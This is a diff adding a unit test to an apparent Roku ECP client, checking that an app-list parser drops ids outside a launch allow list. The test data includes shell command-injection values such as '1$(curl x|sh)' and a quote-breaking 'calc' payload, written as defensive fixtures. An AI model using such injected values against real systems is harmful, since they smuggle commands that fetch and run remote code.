@@ -117,6 +117,14 @@ def test_parse_apps_keeps_ids_names_types() -> None:
     ]
 
 
+def test_parse_apps_drops_ids_outside_the_launch_allow_list() -> None:
+    body = (
+        b'<apps><app id="12">Netflix</app><app id="1$(curl x|sh)">Evil</app>'
+        b'<app id="1&quot;;calc;&quot;">Evil2</app><app id="tvinput.hdmi9">Bad</app></apps>'
+    )
+    assert parse_apps(body) == [App("12", "Netflix", "")]
+
+
 class FakeTransport:
     def __init__(self, response: EcpResponse | None = None, error: OSError | None = None) -> None:
         self.response = response or EcpResponse(200, {}, b"")
